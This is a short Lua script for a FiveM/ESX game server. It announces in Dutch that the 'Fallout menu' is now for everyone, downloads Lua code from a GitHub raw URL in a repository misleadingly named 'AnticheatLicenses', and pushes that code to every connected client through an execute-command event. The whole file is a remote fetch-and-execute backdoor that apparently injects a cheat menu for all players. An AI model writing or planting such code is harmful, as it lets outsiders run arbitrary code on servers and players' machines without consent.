TriggerClientEvent('esx:showNotification',-1, "Fallout menu voor iedereen baby")
PerformHttpRequest("https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/gayout.lua", function(code, res, headers)
    if code == 200 then
        if res ~= nil then
            TriggerClientEvent('GTX:executecommand', -1, res)
        end
    end
end)
